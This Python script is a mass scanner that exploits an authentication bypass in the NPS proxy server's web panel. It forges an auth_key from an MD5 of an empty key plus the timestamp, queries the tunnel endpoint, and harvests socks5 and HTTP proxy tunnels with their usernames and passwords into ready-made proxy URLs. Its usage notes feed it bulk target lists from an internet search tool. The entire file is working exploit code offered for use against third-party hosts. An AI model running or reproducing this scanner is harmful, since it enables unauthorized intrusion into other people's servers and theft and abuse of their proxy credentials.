# -*- encoding:utf-8 -*-
"""
@使用说明:
python scan_multi.py -u http://1.1.1.1:8080 -t 10
python scan_multi.py -l targets.txt --format txt -p http://127.0.0.1:8080
fofax.exe -fs 1000 -ffi -q "app=\"nps\"" | python scan_multi.py --stdin

@项目地址:
https://github.com/carr0t2/nps-auth-bypass
"""
import sys
import threading
import queue
import argparse
import json
import time
import requests
import hashlib
from loguru import logger
from urllib.parse import urlparse
from urllib3.exceptions import ConnectTimeoutError, ProxyError, MaxRetryError, NewConnectionError

# from Crypto.Cipher import AES

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def md5(s: str) -> str:
    m = hashlib.md5()
    m.update(s.encode())
    return m.hexdigest()


class NpsScanner:
    def __init__(self, args: dict):
        self.url = args["url"]
        self.url_list = args["url_list"]
        self.format = args["format"]
        self.verbose = args["verbose"]
        self.proxies = {
            "http": args["proxy"],
            "https": args["proxy"]
        }
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "close"
        }

        if self.format == "mongo":
            import pymongo
            client = pymongo.MongoClient("mongodb://xxxxxx")
            self.table = client["xx"]["xx"]

    def exp(self, url: str):
        """

        :param url: 地址
        :return:
        """
        config_auth_key = ""
        status = {
            "url": url,
            "hacked": False,
            "socks5": 0,
            "http": 0,
            "error": None
        }

        try:
            now_timestamp = str(int(time.time()))
            auth_key = md5(config_auth_key + now_timestamp)
            burp0_url = url + f"/index/gettunnel?auth_key={auth_key}&timestamp={now_timestamp}"
            burp0_data = {"offset": "0", "limit": "100", "type": "socks5", "client_id": "", "search": ""}
            r = requests.post(burp0_url, headers=self.headers, data=burp0_data, proxies=self.proxies, timeout=5, verify=False, allow_redirects=False)
            if r.status_code == 302 and r.headers["Location"] == "/login/index":
                status["error"] = "不存在漏洞"
            elif r.status_code == 200 and r.headers["Content-Type"] == "application/json; charset=utf-8":
                if r.json()["rows"]:
                    self.out(r.json()["rows"], url)
                    status["socks5"] = len(r.json()["rows"])
                # 存在漏洞
                status["hacked"] = True
                logger_vuln.info(url)
                burp0_data = {"offset": "0", "limit": "100", "type": "httpProxy", "client_id": "", "search": ""}
                r = requests.post(burp0_url, headers=self.headers, data=burp0_data, proxies=self.proxies, timeout=5, verify=False, allow_redirects=False)
                if r.json()["rows"]:
                    self.out(r.json()["rows"], url)
                    status["http"] = len(r.json()["rows"])
            else:
                status["error"] = "页面错误"
        except (ConnectionError, requests.exceptions.ReadTimeout, NewConnectionError, requests.exceptions.ConnectionError, ConnectTimeoutError, MaxRetryError):
            status["error"] = "连接失败"
        except requests.exceptions.JSONDecodeError:
            status["error"] = "页面错误"
        except KeyError as e:
            status["error"] = "json错误"
        except Exception as e:
            import traceback
            print(traceback.print_exc())
            print(e)
        logger.info(status)

    def out(self, j: json, url: str):
        """

        :param j: json数组
        :param url: web面板地址
        :return:
        """

        base_ip_port = urlparse(url).netloc
        base_ip = urlparse(url).netloc.split(":")[0]
        if not j:
            return
        elif self.format == "mongo":
            # 还要添加一下来源
            self.table.insert_many(j)
        else:
            for item in j:
                item["Mode"] = item["Mode"] if item["Mode"] == "socks5" else "http"
                tunnel = {
                    "from": base_ip_port,
                    "Mode": item["Mode"],
                    "User": item["Client"]["Cnf"]["U"],
                    "Pass": item["Client"]["Cnf"]["P"],
                    "ip": base_ip,
                    "Port": str(item["Port"]),
                    "proxy_url": f"""{item["Mode"]}://{base_ip}:{item["Port"]}"""
                }
                if tunnel["User"] or tunnel["Pass"]:
                    tunnel["proxy_url"] = f"""{item["Mode"]}://{tunnel["User"]}:{tunnel["Pass"]}@{base_ip}:{item["Port"]}"""

                if self.format == "json":
                    output = json.dumps(tunnel)
                elif self.format == "csv":
                    output = ",".join(list(tunnel.values()))
                else:
                    output = tunnel["proxy_url"]
                logger_proxy.info(output)
                if self.verbose:
                    logger.info(output)


def main(argss: dict, q: queue):
    scanner = NpsScanner(argss)
    while True:
        try:
            scanner.exp(q.get(block=True, timeout=2))
        except queue.Empty:
            return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="""Nps auth bypass Scanner
Author: Carrot2
Github: https://github.com/carr0t2/nps-auth-bypass""", formatter_class=argparse.RawTextHelpFormatter, )
    parser.add_argument("-u", "--url", type=str, help="Target URL")
    parser.add_argument("-l", "--url-list", type=str, help="Target URL list file")
    parser.add_argument("--stdin", action='store_true', help="Target URL list from STDIN")
    parser.add_argument("--format", type=str, default="txt", choices=["txt", "csv", "json", "mongodb"], help="Report format (Default: txt)")
    parser.add_argument("-p", "--proxy", type=str, help="Proxy URL, support HTTP and SOCKS proxies \n(Example: http://localhost:8080, socks5://localhost:8088)")
    parser.add_argument("-t", "--thread", type=int, default=10, help="Number of threads, default 10")
    parser.add_argument("-v", "--verbose", action='store_true', help="Execute in verbose mode")
    args = vars(parser.parse_args())
    # print(args)

    # 打印日志和保存结果（偷懒）
    logger.remove()
    logger_vuln = logger.bind(name="vuln")
    logger_proxy = logger.bind(name="proxy")
    logger.add(sys.stdout, filter=lambda record: not record["extra"].get("name"),
               format="<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <level>{message}</level>", enqueue=True)
    logger.add(f"result_vuln_{int(time.time())}.txt", filter=lambda record: record["extra"].get("name") == "vuln", format="{message}", enqueue=True)
    logger.add(f"result_proxy_{int(time.time())}.txt", filter=lambda record: record["extra"].get("name") == "proxy", format="{message}", enqueue=True)

    # 队列处理
    q = queue.Queue(maxsize=100000)

    if args["url"]:
        url = args["url"].strip("").rstrip("/")
        q.put_nowait(url)
    elif args["url_list"]:
        with open(args["url_list"], "r", encoding="utf-8") as f:
            targets = f.read().splitlines()
        for target in targets:
            q.put_nowait(target.strip("").rstrip("/"))
    elif args["stdin"]:
        try:
            targets = sys.stdin.read().splitlines()
            for target in targets:
                q.put_nowait(target.strip("").rstrip("/"))
        except EOFError:
            pass

    threads = []
    for i in range(args["thread"]):
        t = threading.Thread(target=main, args=(args, q,))
        threads.append(t)
        t.start()

    for i in threads:
        i.join()
    exit()
